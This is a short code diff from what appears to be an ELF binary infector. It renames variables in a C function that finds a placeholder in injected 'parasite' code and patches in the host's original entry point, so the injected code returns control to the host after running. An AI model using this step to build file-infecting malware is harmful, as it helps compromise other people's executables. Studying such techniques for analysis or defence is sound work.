@@ -46,18 +46,18 @@ Elf64_Off		text_segment_end_offset;		// Location to inject parasite
 
 // Finds the placeholder (for address where our parasite code will jump after executing its body) and
 // writes the host's entry point (original entry point address) to it.
-void AddrPatcher(u_int8_t *parasite, long find_value, long replace_value)
+void AddrPatcher(u_int8_t *parasite, long placeholder, long address)
 {
 	u_int8_t *ptr = parasite;
 
 	int i;
 	for (i = 0 ; i < parasite_size ; ++i)
 	{
-		long current_QWORD = *((long *)(ptr + i));
+		long potential_placeholder = *((long *)(ptr + i));
 		
-		if ( !(find_value ^ current_QWORD) ) 
+		if ( !(placeholder ^ potential_placeholder) ) 
 		{
-			*((long *)(ptr + i)) = replace_value;
+			*((long *)(ptr + i)) = address;
 			return;
 		}
 	}
